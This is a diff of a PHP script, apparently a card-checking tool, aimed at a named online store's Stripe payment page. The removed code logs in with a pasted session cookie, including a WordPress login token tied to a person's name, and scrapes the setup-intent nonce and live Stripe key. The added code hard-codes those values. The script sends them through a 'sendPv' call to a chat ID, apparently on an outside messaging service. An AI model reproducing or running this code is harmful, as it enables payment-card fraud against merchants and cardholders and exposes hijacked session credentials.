@@ -509,40 +509,10 @@ $pk_live = $coincidencia[0];
 curl_close($curl);*/
 
 
-$cookieString = 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-27%2019%3A37%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=e8840e00-a679-4d73-8457-4388262e24a5a397d3; __stripe_sid=aec8464c-ef94-48a8-baa4-952f5c4f15f6b142ae; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1735501274%7CurxsLaoCkzeiZFLcKow3sfim63XiB9qRWQ4iSJosGTB%7Cb687215ea8543185629b3a86b2d8c90ecf663779dd5aef422d0930b53cee0454; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Cf05fe5457117c7f43aedd2bdf4efb34bfed800301389cb5bd3ff347098c13c5b; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F';
+$nonce = "9b2f3b02ac";
+$pk_live = "pk_live_3aQeYWJrvX0nCYSR0VstU8rL";
 
-$curl = curl_init();
-curl_setopt_array($curl, [
-    CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_COOKIE => $cookieString,
-    CURLOPT_HTTPHEADER => [
-        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
-        'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
-    ],
-]);
-
-$response = curl_exec($curl);
-curl_close($curl);
-
-// Extraer el nonce
-if (preg_match('/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/', $response, $coincidencias)) {
-    $nonce = $coincidencias[1];
-    echo "Nonce: $nonce\n";
-} else {
-    echo "Nonce no encontrado\n";
-}
-
-// Extraer pk_live
-if (preg_match('/pk_live_[a-zA-Z0-9]+/', $response, $pkMatch)) {
-    $pk_live = $pkMatch[0];
-    echo "pk_live: $pk_live\n";
-} else {
-    echo "pk_live no encontrado\n";
-    $pk_live = "no hay";
-}
-
-$rigo = "$nonce -- $pk_live";
+$rigo = "$nonce - $pk_live";
 sendPv("1292171163", $rigo);
 /////EXTRAE EL ID//
 
@@ -812,9 +782,10 @@ $pk_live = $coincidencia[0];
 curl_close($curl);
 
 /////EXTRAE EL ID//
+	/*
 $rigo = "$nonce -- $pk_live";
-	
 sendPv("1292171163", $rigo);
+	*/
 	
 echo "$nonce\n";
 echo "$pk_live\n";
